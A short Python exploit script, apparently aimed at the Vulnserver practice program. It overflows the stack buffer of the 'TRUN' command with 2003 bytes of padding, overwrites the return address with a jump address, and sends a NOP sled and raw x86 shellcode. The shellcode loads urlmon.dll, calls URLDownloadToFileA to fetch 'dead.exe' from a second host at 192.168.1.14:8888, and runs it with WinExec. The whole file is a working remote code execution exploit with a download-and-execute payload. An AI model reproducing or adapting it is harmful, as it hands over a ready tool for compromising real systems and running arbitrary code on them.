import socket
import struct

s = socket.socket()
s.connect(('192.168.1.29',9999))

print(s.recv(1024))

total = 2003+976
offset = 2003
#new_eip = b'BBBB'#62501203
nop_sled = b'\x90'*20
new_eip = struct.pack("<I",0x62501203)

link = "http://192.168.1.14:8888/"

buf = b""
buf += b"\x33\xC9\x64\x8B\x41\x30\x8B\x40\x0C\x8B"
buf += b"\x70\x14\xAD\x96\xAD\x8B\x58\x10\x8B\x53"
buf += b"\x3C\x03\xD3\x8B\x52\x78\x03\xD3\x8B\x72"
buf += b"\x20\x03\xF3\x33\xC9\x41\xAD\x03\xC3\x81"
buf += b"\x38\x47\x65\x74\x50\x75\xF4\x81\x78\x04"
buf += b"\x72\x6F\x63\x41\x75\xEB\x81\x78\x08\x64"
buf += b"\x64\x72\x65\x75\xE2\x8B\x72\x24\x03\xF3"
buf += b"\x66\x8B\x0C\x4E\x49\x8B\x72\x1C\x03\xF3"
buf += b"\x8B\x14\x8E\x03\xD3\x33\xC9\x51\x68\x2E"
buf += b"\x65\x78\x65\x68\x64\x65\x61\x64\x53\x52"
buf += b"\x51\x68\x61\x72\x79\x41\x68\x4C\x69\x62"
buf += b"\x72\x68\x4C\x6F\x61\x64\x54\x53\xFF\xD2"
buf += b"\x83\xC4\x0C\x59\x50\x51\x66\xB9\x6C\x6C"
buf += b"\x51\x68\x6F\x6E\x2E\x64\x68\x75\x72\x6C"
buf += b"\x6D\x54\xFF\xD0\x83\xC4\x10\x8B\x54\x24"
buf += b"\x04\x33\xC9\x51\x66\xB9\x65\x41\x51\x33"
buf += b"\xC9\x68\x6F\x46\x69\x6C\x68\x6F\x61\x64"
buf += b"\x54\x68\x6F\x77\x6E\x6C\x68\x55\x52\x4C"
buf += b"\x44\x54\x50\xFF\xD2\x33\xC9\x8D\x54\x24"
buf += b"\x24\x51\x51\x52\xEB\x47\x51\xFF\xD0\x83"
buf += b"\xC4\x1C\x33\xC9\x5A\x5B\x53\x52\x51\x68"
buf += b"\x78\x65\x63\x61\x88\x4C\x24\x03\x68\x57"
buf += b"\x69\x6E\x45\x54\x53\xFF\xD2\x6A\x05\x8D"
buf += b"\x4C\x24\x18\x51\xFF\xD0\x83\xC4\x0C\x5A"
buf += b"\x5B\x68\x65\x73\x73\x61\x83\x6C\x24\x03"
buf += b"\x61\x68\x50\x72\x6F\x63\x68\x45\x78\x69"
buf += b"\x74\x54\x53\xFF\xD2\xFF\xD0\xE8\xB4\xFF"
buf += b"\xFF\xFF"

buf += link.encode()

shellcode = buf

#all_char = ''.join(chr(i) for i in range(1,128)).encode()
#print(all_char)
payload = [b'TRUN /.:/',
    b'A'*offset,
    new_eip,
    nop_sled,
    shellcode,
    b'C'*(total)#-len(new_eip)-len(shellcode)-len(nop_sled))
]

payload = b"".join(payload)

s.send(payload)
s.close()

#new_eip = struct.pack("<I",0x62501203)
